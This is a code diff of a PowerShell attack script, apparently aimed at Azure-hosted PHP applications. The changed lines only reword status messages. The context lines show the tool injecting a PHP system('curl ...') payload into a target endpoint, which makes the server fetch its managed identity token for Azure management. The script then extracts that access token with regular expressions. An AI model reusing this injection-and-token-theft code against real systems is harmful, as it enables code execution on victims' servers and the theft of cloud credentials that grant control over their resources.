@@ -10,11 +10,11 @@ If ($Response -Match "IDENTITY") {
     Write-Host "Extracting Endpoint..."
     $regex = '(?<=POINT=)[\w:/.-]+'
     $Identity_Endpoint = (Select-String -inputObject $Response -Pattern $regex | ForEach-Object {$_.Matches.Value})
-    Write-Host "Identity Endpoint found @"$Identity_Endpoint "[Stored in `$Identity_Endpoint]"
+    Write-Host "Identity Endpoint found: $Identity_Endpoint [Stored in `$Identity_Endpoint]"
     Write-Host "Extracting Header..."
     $regex = '(?<=IDENTITY_HEADER=)[\w:/.-]+'
     $Identity_Header = (Select-String -InputObject $Response -Pattern $regex | ForEach-Object {$_.Matches.Value})
-    Write-Host "Identity Header found @"$Identity_Header "[Stored in `$Identity_Header]"
+    Write-Host "Identity Header found:"$Identity_Header "[Stored in `$Identity_Header]"
     #Needs to be tested
     $GetMIToken = $envendpoint + "<?php system('curl `"`$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01`" -H secret:`$IDENTITY_HEADER'); ?>"
     Write-Host "Attempting to extract Managed Identity Token..."
@@ -24,7 +24,7 @@ If ($Response -Match "IDENTITY") {
     $regex = '(?<=access_token":")[\w-.]+'
     $Identity_Token = (Select-String -InputObject $IdentityTokenResponse -Pattern $regex | ForEach-Object {$_.Matches.Value})
     If ($Identity_Token -match '^eyj') {
-        Write-Host "Managed Identity Token is $Identity_Token [Stored in `$Identity_Token]"
+        Write-Host "Managed Identity Token: $Identity_Token [Stored in `$Identity_Token]"
     }
     #If $IdentityTokenResponse
     #Add If/Then/Fail
